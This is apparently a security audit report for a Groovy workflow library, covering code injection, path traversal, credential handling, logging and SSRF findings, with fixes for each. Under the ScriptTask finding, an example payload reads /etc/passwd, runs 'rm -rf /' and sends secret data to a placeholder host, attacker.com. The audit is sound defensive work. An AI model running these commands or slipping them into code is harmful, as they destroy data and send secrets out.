# Security Audit Report - org.softwood.dag Package

**Date:** 2026-01-20
**Scope:** Complete security review of TaskGraph codebase
**Status:** CRITICAL FINDINGS IDENTIFIED

---

## 🔴 CRITICAL - Immediate Action Required

### 1. **ScriptTask - Arbitrary Code Execution Vulnerability**

**File:** `src/main/groovy/org/softwood/dag/task/ScriptTask.groovy`

**Risk Level:** 🔴 CRITICAL
**CVE Category:** CWE-94 (Code Injection), CWE-95 (Eval Injection)

**Issue:**
```groovy
// Line 190-191
def shell = new GroovyShell()
compiledGroovyScript = shell.parse(script)

// Line 232
return engine.eval(script)
```

**Attack Vector:**
- Users can execute arbitrary Groovy/JavaScript/Python code
- No sandboxing, script validation, or ACL enforcement
- Full JVM access - can read files, execute commands, access network
- Can bypass ALL security controls

**Exploit Example:**
```groovy
scriptTask("malicious") {
    script """
        // Arbitrary file read
        new File('/etc/passwd').text

        // Command execution
        Runtime.getRuntime().exec('rm -rf /')

        // Network exfiltration
        new URL('http://attacker.com').text = secretData
    """
}
```

**Recommendations:**
1. ❌ **REMOVE ScriptTask entirely** (safest option)
2. ⚠️ **Add SecurityManager with whitelist** (complex, error-prone)
3. ✅ **Replace with sandboxed DSL** - limited, safe operations only
4. ✅ **Document as "TRUSTED CODE ONLY"** - warn users prominently

---

## 🟡 HIGH - Security Hardening Needed

### 2. **FileTask - Path Traversal (Partially Mitigated)**

**Files:** `FileTask.groovy`, `FileTaskSecurityValidator.groovy`

**Risk Level:** 🟡 HIGH (mitigated in strict mode)
**CVE Category:** CWE-22 (Path Traversal)

**Good News:**
- ✅ FileTaskSecurityValidator exists with path traversal checks
- ✅ Canonical path validation
- ✅ Symlink target validation
- ✅ Strict mode available

**Remaining Risks:**
- ⚠️ **Default is permissive mode** - no validation unless configured
- ⚠️ User must explicitly enable strict mode
- ⚠️ No documentation warning about security

**Recommendations:**
1. ✅ **Change default to strict mode** (breaking change, but safer)
2. ✅ **Require explicit opt-out** for permissive mode
3. ✅ **Add security documentation** to README

---

### 3. **Credential Management - Insecure Handling**

**Files:** 53 files with passwords/credentials/tokens

**Risk Level:** 🟡 HIGH
**CVE Category:** CWE-798 (Hard-coded Credentials), CWE-311 (Missing Encryption)

**Issues:**
- Database passwords stored in plain text config
- API keys/tokens in MailTask, HttpTask, SQL providers
- No credential vault integration (AWS Secrets Manager, HashiCorp Vault)
- Credentials may be logged in debug mode

**Example - SqlProvider:**
```groovy
def config = [
    url: "jdbc:postgresql://localhost:5432/db",
    username: "admin",
    password: "secret123"  // ⚠️ Plain text
]
```

**Recommendations:**
1. ✅ **Add CredentialProvider interface** - pluggable vault support
2. ✅ **Warn against plain-text passwords** in documentation
3. ✅ **Sanitize logging** - never log credentials
4. ✅ **Provide examples** for AWS/Azure/Vault integration

---

## 🟢 GOOD - Already Hardened

### 4. **Cluster Security - Message Validation**

**File:** `cluster/ClusterTaskEvent.groovy`, `cluster/ClusterMessageValidator.groovy`

**Status:** ✅ SECURE

**Protections:**
- HMAC signature validation on cluster messages
- Message integrity checks
- Source node verification
- Replay attack prevention (via timestamp)

---

### 5. **Resource Exhaustion Protection**

**File:** `resilience/ResourceMonitor.groovy`

**Status:** ✅ SECURE

**Protections:**
- Concurrency limits (semaphore-based)
- Memory limits with monitoring
- Queue depth limits
- Fail-fast or backpressure options

---

## 🟡 MEDIUM - Improvements Recommended

### 6. **Deserialization - Limited Exposure**

**Files:** 8 files with `Serializable`

**Risk Level:** 🟡 MEDIUM
**CVE Category:** CWE-502 (Unsafe Deserialization)

**Status:**
- ⚠️ Cluster messages use Java serialization (Hazelcast)
- ⚠️ Persistence uses EclipseStore (custom serialization)
- ✅ No user-controlled deserialization found
- ✅ Cluster messages have signature validation

**Recommendations:**
1. ✅ **Prefer JSON/Protocol Buffers** over Java serialization
2. ✅ **Validate object types** before deserialization
3. ⚠️ **Monitor Hazelcast CVEs** - update regularly

---

### 7. **Logging - Sensitive Data Exposure**

**Risk Level:** 🟡 MEDIUM
**CVE Category:** CWE-532 (Information Exposure Through Log Files)

**Issues:**
- Task inputs/outputs logged at DEBUG level
- Prev/result values may contain PII/credentials
- No log sanitization

**Example:**
```groovy
log.debug "Task $id: raw unwrapped value: $prevValue"  // ⚠️ May log secrets
```

**Recommendations:**
1. ✅ **Add logging sanitizer** - redact sensitive fields
2. ✅ **Warn users** about logging sensitive data
3. ✅ **Provide examples** of safe logging patterns

---

## 🟢 LOW - Minor Hardening

### 8. **HTTP Task - SSRF Risk**

**File:** `task/HttpTask.groovy`

**Risk Level:** 🟢 LOW
**CVE Category:** CWE-918 (SSRF)

**Issue:**
- Users can make HTTP requests to arbitrary URLs
- Could be used for internal network scanning

**Mitigations (already present):**
- ✅ Timeout protection
- ✅ User controls URL (intentional feature)

**Recommendations:**
1. ⚠️ **Optional URL whitelist** for paranoid users
2. ✅ **Document SSRF risks** in HTTP task guide

---

## Summary & Priority Actions

### Immediate (This Week):
1. 🔴 **ScriptTask**: Add prominent security warning to documentation
2. 🔴 **ScriptTask**: Consider deprecation or sandbox implementation
3. 🟡 **FileTask**: Change default to strict mode (or document prominently)

### Short-Term (This Month):
4. 🟡 **Credentials**: Add CredentialProvider interface + examples
5. 🟡 **Logging**: Implement sanitization for sensitive data
6. 🟡 **Documentation**: Create SECURITY.md with best practices

### Long-Term (Future Releases):
7. 🟢 **Deserialization**: Migrate cluster to JSON/Protobuf
8. 🟢 **SSRF**: Add optional URL filtering for HttpTask

---

## Positive Security Findings

✅ **Strong cluster security** - signature validation, integrity checks
✅ **Resource exhaustion protection** - DoS mitigation built-in
✅ **Path traversal protection** - available in FileTask strict mode
✅ **No SQL injection** - using prepared statements in SqlTask
✅ **No XXE vulnerabilities** - no XML parsing found

---

## Compliance Notes

**OWASP Top 10 Coverage:**
- ✅ A03:2021 - Injection: Mostly mitigated (except ScriptTask)
- ✅ A05:2021 - Security Misconfiguration: Good defaults (except FileTask)
- ⚠️ A07:2021 - Identification/Authentication: User's responsibility
- ⚠️ A09:2021 - Security Logging: Needs sanitization

**Verdict:** Library is reasonably secure for defensive use cases. ScriptTask is the only critical vulnerability requiring immediate attention.
